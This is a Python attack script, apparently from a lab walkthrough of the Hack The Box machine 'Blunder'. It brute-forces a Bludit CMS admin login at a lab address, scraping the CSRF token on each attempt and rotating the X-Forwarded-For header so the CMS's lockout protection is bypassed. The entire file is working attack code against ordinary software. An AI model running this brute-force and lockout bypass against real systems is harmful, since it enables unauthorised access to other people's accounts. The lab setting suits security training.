#!/usr/bin/python3
#S4vitar maquina Blunder
import requests, re, time, sys, signal
from pwn import *

def def_handler(sig, frame):
    print("\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Global variables
main_url = "http://10.10.10.191/admin/login.php"

if __name__ == '__main__':

    s = requests.session()

    p1 = log.progress("Brute Force")
    p1.status("Starting brute force...")
    time.sleep(2)

    with open('dictionary.txt') as fp:
        for password in fp.read().splitlines():

            r = s.get(main_url)

            csrfToken = re.findall(r"name=\"tokenCSRF\" value=\"(.*?)\"", r.text)[0]

            headers_data = {
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36',
                'Referer': 'http://10.10.10.191/admin/login.php',
                'X-Forwarded-For': password
            }

            post_data = {
                'tokenCSRF': '%s' % csrfToken,
                'username': '%s' % 'fergus',
                'password': '%s' % password
            }

            r = s.post(main_url, data=post_data, headers=headers_data)
            p1.status("Trying with password %s" % password)

            if "Username or password incorrect" not in r.text:
                p1.success("The correct password is %s" % password)
                sys.exit(0)
